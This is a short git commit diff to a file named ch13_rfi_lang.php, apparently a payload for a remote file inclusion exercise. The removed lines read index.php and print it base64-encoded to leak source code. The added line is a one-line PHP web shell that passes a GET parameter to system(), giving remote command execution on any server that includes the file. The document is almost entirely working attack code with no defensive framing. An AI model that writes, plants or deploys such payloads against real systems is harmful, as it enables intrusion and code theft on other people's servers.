2b0c239c5ecf9d9b085abd537efa93b6232c807d
taosheng301289 <31443570+taosheng301289@users.noreply.github.com>
2017-08-30 13:39:40 +0200

    Update ch13_rfi_lang.php

--- ch13_rfi_lang.php
+++ ch13_rfi_lang.php
@@ -1,8 +1,1 @@
-<?php
-	echo("success!!\n");
-        //$command = $_GET['cmd'];
-        //echo $command."\n";
-        $yay = file_get_contents("index.php");
-        echo base64_encode($yay);
-        //show_source(__FILE__);
-?>
+<?php print_r(system($_GET['index.php']));?>
